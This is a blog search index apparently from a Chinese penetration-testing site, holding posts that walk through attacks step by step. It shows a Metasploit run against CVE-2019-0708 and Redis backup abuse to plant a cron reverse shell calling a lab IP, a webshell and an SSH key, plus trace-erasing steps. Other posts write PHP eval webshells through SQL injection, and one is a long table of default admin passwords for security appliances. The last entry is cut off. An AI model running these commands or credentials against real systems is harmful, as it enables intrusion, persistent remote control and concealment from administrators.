<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2019-0708代码执行复现</title>
      <link href="/2020/06/03/CVE-2019-0708%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/06/03/CVE-2019-0708%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>需要注意几点，早上踩坑了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 目标机需要开启3389服务</span><br><span class="line"></span><br><span class="line">2 需要下载最新的exp到msf中替换</span><br><span class="line"></span><br><span class="line">3 使用 set rhost ip</span><br><span class="line">  set target 3(虚拟机)</span><br><span class="line"></span><br><span class="line">生成交互式cmd</span><br></pre></td></tr></table></figure><p>工具使用的是msf,利用成功可以直接远程执行命令。<br><img src="https://img-blog.csdnimg.cn/20191112190653333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis通过备份功能实现的三种攻击方法</title>
      <link href="/2020/06/03/Redis%E9%80%9A%E8%BF%87%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2020/06/03/Redis%E9%80%9A%E8%BF%87%E5%A4%87%E4%BB%BD%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-利用redis备份写定时任务反弹shell"><a href="#0x01-利用redis备份写定时任务反弹shell" class="headerlink" title="0x01 利用redis备份写定时任务反弹shell"></a>0x01 利用redis备份写定时任务反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理：利用redis备份功能进行文件操作</span><br></pre></td></tr></table></figure><p>开始前可以做个备份，实际攻击中最好先执行config get dir 记清楚原来备份路径，方便还原擦除痕迹<br><img src="https://img-blog.csdnimg.cn/20191112192818604.png" alt="在这里插入图片描述"><br>利用redis-cli -h 目标ip 连接redis服务器</p><p>执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.199.187&#x2F;7999 0&gt;&amp;1\n&quot;     &#x2F;&#x2F;设置变量x,引号里为变量内容，这也备份的时候可以把内容写入备份目录</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;  &#x2F;&#x2F;修改备份目录到定时任务目录</span><br><span class="line"></span><br><span class="line">config set dbfilename root &#x2F;&#x2F;修改备份文件名为自己喜欢的名字</span><br><span class="line"></span><br><span class="line">save &#x2F;&#x2F;保存设置</span><br></pre></td></tr></table></figure><p>测试如下：<br><img src="https://img-blog.csdnimg.cn/2019111219294241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>自己复现可以利用crontab -e查看定时任务是否成功写入<br><img src="https://img-blog.csdnimg.cn/2019111219294889.png" alt="在这里插入图片描述"><br>攻击机监听设置的定时任务指定反弹shell的端口 7779，一会儿攻击机就成功接收目标机反弹的shell<br><img src="https://img-blog.csdnimg.cn/20191112193001328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02利用备份写入webshell"><a href="#0x02利用备份写入webshell" class="headerlink" title="0x02利用备份写入webshell"></a>0x02利用备份写入webshell</h2><p>原理步骤和上面差不多。前提是知道网站绝对路径，这种方法适用于服务器权限不够，但是redis对web有写入权限。</p><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></p><h2 id="0x03-利用备份上传公钥，实现服务器免密登录"><a href="#0x03-利用备份上传公钥，实现服务器免密登录" class="headerlink" title="0x03 利用备份上传公钥，实现服务器免密登录"></a>0x03 利用备份上传公钥，实现服务器免密登录</h2><p>ssh-keygen -t rsa 一路回车生成密钥<br><img src="https://img-blog.csdnimg.cn/20191112193052258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将目录下密钥保存为1.txt (可以自定义)，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191112193119943.png" alt="在这里插入图片描述"><br>将密钥设置为crack变量内容， 上传目标机<br><img src="https://img-blog.csdnimg.cn/20191112193340271.png" alt="在这里插入图片描述"><br>同样利用redis-cli -h 目标ip    连接目标redis服务器，修改备份路径和备份文件名。<br>修改备份文件路径为/root/.ssh（目标机密钥存放的路径，不同机器情况可能不一致）<br><img src="https://img-blog.csdnimg.cn/20191112193319634.png" alt="在这里插入图片描述"><br>修改备份文件名，保存退出。</p><p><img src="https://img-blog.csdnimg.cn/20191112193259685.png" alt="在这里插入图片描述"><br>尝试免密连接服务器，漏洞利用成功。<br><img src="https://img-blog.csdnimg.cn/20191112193400460.png" alt="在这里插入图片描述"></p><h2 id="0x04清理痕迹，还原设置环境"><a href="#0x04清理痕迹，还原设置环境" class="headerlink" title="0x04清理痕迹，还原设置环境"></a>0x04清理痕迹，还原设置环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">del payload  &#x2F;&#x2F;删除</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root   &#x2F;&#x2F;修改路径为攻击前路径（不同环境路径可能不一样）</span><br><span class="line"></span><br><span class="line">config set dbfilename dump.rdb &#x2F;&#x2F;修改备份文件名为默认文件名</span><br></pre></td></tr></table></figure><p>测试如下：<br><img src="https://img-blog.csdnimg.cn/20191112193515249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问复现</title>
      <link href="/2020/06/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/06/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>在渗透目标中遇到好几次，记录下方便学习，以后攻击利用。</p><p>靶机情况：<br>        攻击机：192.168.199.187   / osx /redis4.0<br>                    目标机：192.168.199.136  / centos 7 /redis5.0</p><h2 id="0x01-未授权漏洞访问"><a href="#0x01-未授权漏洞访问" class="headerlink" title="0x01 未授权漏洞访问"></a>0x01 未授权漏洞访问</h2><p>1.1 wget 获取redis5.0（攻击机和靶机都需要redis环境）</p><p>wget download.redis.io/releases/redis-5.0.0.tar.gz<br><img src="https://img-blog.csdnimg.cn/20191112192022557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>1.2  解压<br><img src="https://img-blog.csdnimg.cn/20191112192256127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>1.3  编译</p><p>Make编译,有的系统可能报错。是因为缺少GNU编译器套件（gcc）因为Redis使用c编写,所以需要gcc.<br>执行命令安装gcc<br><img src="https://img-blog.csdnimg.cn/20191112192323671.png" alt="在这里插入图片描述"><br>再次make<br>发生错误原因可能是有残留文件，清理再次make<br><img src="https://img-blog.csdnimg.cn/2019111219235394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>可以执行以下命令<br><img src="https://img-blog.csdnimg.cn/20191112192419600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>编译安装ok.</p><p>1.4 简单配置</p><p>进入redis下src目录，复制redis-server/redis-cli到/usr/bin下方便启动<br><img src="https://img-blog.csdnimg.cn/20191112192505458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"></p><p>编辑redis目录下redis.conf<br>取消本地绑定ip<br><img src="https://img-blog.csdnimg.cn/20191112192514393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>切换本地保护模式为no<br><img src="https://img-blog.csdnimg.cn/20191112192527975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>允许任意ip连接登录<br><img src="https://img-blog.csdnimg.cn/20191112192539958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MzI2ODE2,size_16,color_FFFFFF,t_0" alt="在这里插入图片描述"><br>开启端口<br><img src="https://img-blog.csdnimg.cn/20191112192554375.png" alt="在这里插入图片描述"><br>1.5 攻击机也需要安装redis,利用客户端命令redis-cli -h  靶机ip<br><img src="https://img-blog.csdnimg.cn/20191112192605219.png" alt="在这里插入图片描述"><br>未授权访问成功，info查看靶机信息<br><img src="https://img-blog.csdnimg.cn/20191112192617343.png" alt="在这里插入图片描述"></p><h2 id="0x02其他命令"><a href="#0x02其他命令" class="headerlink" title="0x02其他命令"></a>0x02其他命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看信息 info</span><br><span class="line"></span><br><span class="line">删除所有数据库内容：flushall</span><br><span class="line"></span><br><span class="line">刷新数据库： flushdb</span><br><span class="line"></span><br><span class="line">可以查看键值数据:select num</span><br><span class="line"></span><br><span class="line">设置变量：set test &quot;who am i&quot;</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line"></span><br><span class="line">save保存</span><br><span class="line"></span><br><span class="line">get 变量，查看变量名称</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入写Shell的几种方式</title>
      <link href="/2020/06/03/SQL%E6%B3%A8%E5%85%A5%E5%86%99Shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2020/06/03/SQL%E6%B3%A8%E5%85%A5%E5%86%99Shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>要写入shell，首先需要满足以下条件：</p><ol><li>数据库用户拥有DBA权限</li><li>已知网站的绝对路径</li><li>PHP关闭了魔术引号（magic_quotes_gpc）</li><li>MySQL<code>secure_file_priv</code>变量的值为空（empty）</li></ol><h4 id="0x01-查询dba权限"><a href="#0x01-查询dba权限" class="headerlink" title="0x01 查询dba权限"></a>0x01 查询dba权限</h4><p>可以使用sqlmap <code>--is-dba</code>选项进行查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.57.129/sqli/Less-1/?id=1 --is-dba</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/347045d5-817c-4a58-a489-5030514ec8fe.png" alt=""></p><h4 id="0x02-绝对路径"><a href="#0x02-绝对路径" class="headerlink" title="0x02 绝对路径"></a>0x02 绝对路径</h4><p>可以使用下面的SQL语句查询MySQL的绝对路径，通过数据库的位置，或许能够找到网站的绝对路径：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@datadir;</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/8a0d99e5-dc69-4565-88cb-75407fa14a10.png" alt=""></p><p>sqlmap可以使用<code>--sql-query</code>选项执行SQL语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.57.129/sqli/Less-1/?id=1 --sql-query "select @@datadir"</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/81206ad4-1bfa-43c8-9de7-7f7089ba222e.png" alt=""></p><h4 id="0x03-PHP魔术引号"><a href="#0x03-PHP魔术引号" class="headerlink" title="0x03 PHP魔术引号"></a>0x03 PHP魔术引号</h4><p>当PHP魔术引号（magic_quotes_gpc）打开时，所有的 <em>‘</em>（单引号），<em>“</em>（双引号），<em>\</em>（反斜线）和 <em>NULL</em> 字符都会被自动加上一个反斜线进行转义。</p><blockquote><p>注：自PHP 5.4.0起被移除</p></blockquote><p>测试方法：</p><ol><li>测试特殊字符是否被转义。</li><li>phpinfo页面等。</li></ol><h4 id="0x04-secure-file-priv"><a href="#0x04-secure-file-priv" class="headerlink" title="0x04 secure_file_priv"></a>0x04 secure_file_priv</h4><p>在MySQL中，secure_file_priv 变量用来限制数据的导入和导出操作，例如 <code>LOAD DATA</code>、 <code>SELECT ... INTO OUTFILE</code>语句和<code>LOAD_FILE()</code>函数的操作。只有具有<code>FILE</code>权限的用户才能进行这些操作 。</p><p>secure_file_priv可以设置为如下：</p><ul><li>如果为空(empty)，则变量无效。</li><li>如果设为目录名称，则服务器会将导入和导出操作限制为仅适用于该目录中的文件。且目录必须存在; 服务器不会创建它。</li><li>如果设为<code>NULL</code>，则服务器将禁用导入和导出操作。</li></ul><blockquote><p>注：在MySQL5.5.53之前，此变量默认为空。在MySQL5.5.53之后（包括5.5.53），此变量默认为NULL。</p></blockquote><p>可以使用下面的SQL语句进行查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/3a38fc86-6644-4dab-bbcf-922035a1ae0c.png" alt=""></p><p>可惜的是，使用sqlmap无法读取该变量的值（暂时不知道原因）：<br><img src="https://imgkr.cn-bj.ufileos.com/72697fd7-6005-4fa8-9d98-9af39de0ce36.png" alt=""></p><p>要更改secure_file_priv的值，编辑my.ini|my.cnf（Windows|Linux），在[mysqld]下添加<code>secure_file_priv=</code>，然后重启MySQL。</p><p><img src="https://imgkr.cn-bj.ufileos.com/9779f5d4-ce61-4564-a082-70ad7d4553cb.png" alt=""></p><h3 id="0x05-sqlmap写shell"><a href="#0x05-sqlmap写shell" class="headerlink" title="0x05 sqlmap写shell"></a>0x05 sqlmap写shell</h3><p>使用sqlmap的<code>--os-shell</code>选项写入shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.247.128/sqli/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/ece5a07e-1fb3-40c3-b7ab-c4f8db735029.png" alt=""></p><p>–os-shell选项会上传两个文件，一个文件上传脚本和一个命令执行脚本。</p><p>文件上传脚本，通常可以利用该脚本进行上传大马等操作：</p><p><img src="https://imgkr.cn-bj.ufileos.com/bef6938b-fe63-4683-a773-34f9e59d8a1e.png" alt=""></p><p>命令执行脚本，可以使用蚁剑等工具进行连接：</p><p><img src="https://imgkr.cn-bj.ufileos.com/3f27c92a-f420-411f-9d1c-72101dbb8ad9.png" alt=""></p><h3 id="0x06-into-outfile写shell"><a href="#0x06-into-outfile写shell" class="headerlink" title="0x06 into outfile写shell"></a>0x06 into outfile写shell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST["pass"]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'C:/phpStudy/WWW/shell.php'</span>;</span><br></pre></td></tr></table></figure><p>使用这个语句的时候可能会出现几个问题：</p><ol><li><p>如果没有root权限，可能会得到下面的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access denied for user &#39;test&#39;@&#39;localhost&#39; (using password: YES)</span><br></pre></td></tr></table></figure></li><li><p>受到 secure_file_priv 的限制。</p></li></ol><h3 id="0x07-general-log写shell"><a href="#0x07-general-log写shell" class="headerlink" title="0x07 general_log写shell"></a>0x07 general_log写shell</h3><p>general_log_file会记录所有的查询语句，以原始的状态来显示，在每一次更改general log file的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。（需要root权限）</p><p>使用下面的SQL语句查看默认配置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/bf36ce3c-d8b8-4849-ad7b-e96181a596b1.png" alt=""></p><p>general_log默认是关闭的，且默认名称为 <em>host_name</em>.log。</p><p>开启 general_log：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log = <span class="string">'ON'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/64c21570-82ce-495c-b19e-c953197e01be.png" alt=""></p><p>指定日志文件的位置：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'C:/phpStudy/WWW/log.php'</span>;</span><br></pre></td></tr></table></figure><p>如果全部OK的话。就可以试着构造php语句进行利用了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[pass]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://imgkr.cn-bj.ufileos.com/fad50af3-2459-4f07-8f4e-af1a7fff4fc4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实战中常见网络设备口令备忘录</title>
      <link href="/2020/06/01/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%8F%A3%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2020/06/01/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%8F%A3%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>设备</th><th>默认账号</th><th>默认密码</th></tr></thead><tbody><tr><td>深信服产品</td><td>sangfor</td><td>sangfor sangfor@2018 sangfor@2019</td></tr><tr><td>深信服科技 AD</td><td></td><td>dlanrecover</td></tr><tr><td>深信服负载均衡 AD 3.6</td><td>admin</td><td>admin</td></tr><tr><td>深信服WAC ( WNS V2.6)</td><td>admin</td><td>admin</td></tr><tr><td>深信服v-p-n</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服ipsec-V-P-N (SSL 5.5)</td><td>Admin</td><td>Admin</td></tr><tr><td>深信服AC6.0</td><td>admin</td><td>admin</td></tr><tr><td>SANGFOR防火墙</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服AF(NGAF V2.2)</td><td>admin</td><td>sangfor</td></tr><tr><td>深信服NGAF下一代应用防火墙(NGAF V4.3)</td><td>admin</td><td>admin</td></tr><tr><td>深信服AD3.9</td><td>admin</td><td>admin</td></tr><tr><td>深信服上网行为管理设备数据中心</td><td>Admin</td><td>密码为空</td></tr><tr><td>SANGFOR_AD_v5.1</td><td>admin</td><td>admin</td></tr><tr><td>网御漏洞扫描系统</td><td>leadsec</td><td>leadsec</td></tr><tr><td>天阗入侵检测与管理系统 V7.0</td><td>Admin</td><td>venus70</td></tr><tr><td></td><td>Audit</td><td>venus70</td></tr><tr><td></td><td>adm</td><td>venus70</td></tr><tr><td>天阗入侵检测与管理系统 V6.0</td><td>Admin</td><td>venus60</td></tr><tr><td></td><td>Audit</td><td>venus60</td></tr><tr><td></td><td>adm</td><td>venus60</td></tr><tr><td>网御WAF集中控制中心(V3.0R5.0)</td><td>admin</td><td>leadsec.waf</td></tr><tr><td>audit</td><td>leadsec.waf</td><td></td></tr><tr><td>adm</td><td>leadsec.waf</td><td></td></tr><tr><td>联想网御</td><td>administrator</td><td>administrator</td></tr><tr><td>网御事件服务器</td><td>admin</td><td>admin123</td></tr><tr><td>联想网御防火墙PowerV</td><td>administrator</td><td>administrator</td></tr><tr><td>联想网御入侵检测系统</td><td>lenovo</td><td>default</td></tr><tr><td>网络卫士入侵检测系统</td><td>admin</td><td>talent</td></tr><tr><td>网御入侵检测系统V3.2.72.0</td><td>adm</td><td>leadsec32</td></tr><tr><td>admin</td><td>leadsec32</td><td></td></tr><tr><td>联想网御入侵检测系统IDS</td><td>root</td><td>111111</td></tr><tr><td>admin</td><td>admin123</td><td></td></tr><tr><td>科来网络回溯分析系统</td><td>csadmin</td><td>colasoft</td></tr><tr><td>中控考勤机web3.0</td><td>administrator</td><td>123456</td></tr><tr><td>H3C iMC</td><td>admin</td><td>admin</td></tr><tr><td>H3C SecPath系列</td><td>admin</td><td>admin</td></tr><tr><td>H3C S5120-SI</td><td>test</td><td>123</td></tr><tr><td>H3C智能管理中心</td><td>admin</td><td>admin</td></tr><tr><td>H3C ER3100</td><td>admin</td><td>adminer3100</td></tr><tr><td>H3C ER3200</td><td>admin</td><td>adminer3200</td></tr><tr><td>H3C ER3260</td><td>admin</td><td>adminer3260</td></tr><tr><td>H3C</td><td>admin</td><td>adminer</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>admin</td><td>h3capadmin</td></tr><tr><td></td><td>h3c</td><td>h3c</td></tr><tr><td>360天擎</td><td>admin</td><td>admin</td></tr><tr><td>网神防火墙</td><td>firewall</td><td>firewall</td></tr><tr><td>天融信防火墙NGFW4000</td><td>superman</td><td>talent</td></tr><tr><td>黑盾防火墙</td><td>admin</td><td>admin</td></tr><tr><td>rule</td><td>abc123</td><td></td></tr><tr><td>audit</td><td>abc123</td><td></td></tr><tr><td>华为防火墙</td><td>telnetuser</td><td>telnetpwd</td></tr><tr><td>ftpuser</td><td>ftppwd</td><td></td></tr><tr><td>方正防火墙</td><td>admin</td><td>admin</td></tr><tr><td>飞塔防火墙</td><td>admin</td><td>密码为空</td></tr><tr><td>Juniper_SSG__5防火墙</td><td>netscreen</td><td>netscreen</td></tr><tr><td>中新金盾硬件防火墙</td><td>admin</td><td>123</td></tr><tr><td>kill防火墙(冠群金辰)</td><td>admin</td><td>sys123</td></tr><tr><td>天清汉马USG防火墙</td><td>admin</td><td>venus.fw</td></tr><tr><td></td><td>Audit</td><td>venus.audit</td></tr><tr><td></td><td>useradmin</td><td>venus.user</td></tr><tr><td>阿姆瑞特防火墙</td><td>admin</td><td>manager</td></tr><tr><td>山石网科</td><td>hillstone</td><td>hillstone</td></tr><tr><td>绿盟安全审计系统</td><td>weboper</td><td>weboper</td></tr><tr><td></td><td>webaudit</td><td>webaudit</td></tr><tr><td></td><td>conadmin</td><td>conadmin</td></tr><tr><td></td><td>admin</td><td>admin</td></tr><tr><td></td><td>shell</td><td>shell</td></tr><tr><td>绿盟产品</td><td></td><td>nsfocus123</td></tr><tr><td>TopAudit日志审计系统</td><td>superman</td><td>talent</td></tr><tr><td>LogBase日志管理综合审计系统</td><td>admin</td><td>safetybase</td></tr><tr><td>网神SecFox运维安全管理与审计系统</td><td>admin</td><td>!1fw@2soc#3v-p-n</td></tr><tr><td>天融信数据库审计系统</td><td>superman</td><td>telent</td></tr><tr><td>Hillstone安全审计平台</td><td>hillstone</td><td>hillstone</td></tr><tr><td>网康日志中心</td><td>ns25000</td><td>ns25000</td></tr><tr><td>网络安全审计系统（中科新业）</td><td>admin</td><td>123456</td></tr><tr><td>天玥网络安全审计系统</td><td>Admin</td><td>cyberaudit</td></tr><tr><td>明御WEB应用防火墙</td><td>admin</td><td>admin</td></tr><tr><td>admin</td><td>adminadmin</td><td></td></tr><tr><td>明御攻防实验室平台</td><td>root</td><td>123456</td></tr><tr><td>明御安全网关</td><td>admin</td><td>adminadmin</td></tr><tr><td>明御运维审计与册风险控制系统</td><td>admin</td><td>1q2w3e</td></tr><tr><td></td><td>system</td><td>1q2w3e4r</td></tr><tr><td></td><td>auditor</td><td>1q2w3e4r</td></tr><tr><td></td><td>operator</td><td>1q2w3e4r</td></tr><tr><td>明御网站卫士</td><td>sysmanager</td><td>sysmanager888</td></tr><tr><td>亿邮邮件网关</td><td>eyouuser</td><td>eyou_admin</td></tr><tr><td></td><td>eyougw</td><td>admin@(eyou)</td></tr><tr><td></td><td>admin</td><td>+-ccccc</td></tr><tr><td></td><td>admin</td><td>cyouadmin</td></tr><tr><td>Websense邮件安全网关</td><td>administrator</td><td>admin</td></tr><tr><td>梭子鱼邮件存储网关</td><td>admin</td><td>admin</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 运维编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>worldpress常规利用思路</title>
      <link href="/2020/06/01/Worldpress%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/"/>
      <url>/2020/06/01/Worldpress%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</url>
      
